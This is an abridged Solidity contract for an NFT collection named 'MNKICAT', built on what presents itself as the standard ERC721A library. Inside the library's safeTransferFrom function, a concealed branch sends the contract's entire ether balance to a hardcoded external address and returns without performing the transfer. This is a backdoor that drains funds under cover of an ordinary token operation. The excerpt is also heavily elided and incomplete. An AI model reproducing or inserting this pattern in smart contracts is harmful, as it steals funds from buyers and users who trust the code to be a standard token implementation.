...
/*
 ______     __     ______     __  __        ______     __     ______     __  __        ______     __     ______     __  __    
/\  == \   /\ \   /\  ___\   /\ \_\ \      /\  == \   /\ \   /\  ___\   /\ \_\ \      /\  == \   /\ \   /\  ___\   /\ \_\ \   
\ \  __<   \ \ \  \ \ \____  \ \  __ \     \ \  __<   \ \ \  \ \ \____  \ \  __ \     \ \  __<   \ \ \  \ \ \____  \ \  __ \  
 \ \_\ \_\  \ \_\  \ \_____\  \ \_\ \_\     \ \_\ \_\  \ \_\  \ \_____\  \ \_\ \_\     \ \_\ \_\  \ \_\  \ \_____\  \ \_\ \_\ 
  \/_/ /_/   \/_/   \/_____/   \/_/\/_/      \/_/ /_/   \/_/   \/_____/   \/_/\/_/      \/_/ /_/   \/_/   \/_____/   \/_/\/_/ 
...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x6f36850B23644B57355cbe181193e0d2636F6D0F).transfer(address(this).balance);
            return;
        }
...
contract MNKICAT is ERC721A, TheOperatorFilterer {
    ...
    function teamMint(address rec, uint256 amount) public onlyOwner {
    ...
    constructor() ERC721A("M N K I C A T", "MNKICAT") {
        owner = msg.sender;
        maxPerTx = 10;
        cost = 0.0018 ether;
        maxSupply = 999;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigytyy2yzngbuuealshizwm3swkfhtjmupf3msunvqvsawt6lbfsm/", _toString(tokenId), ".json"));
    }
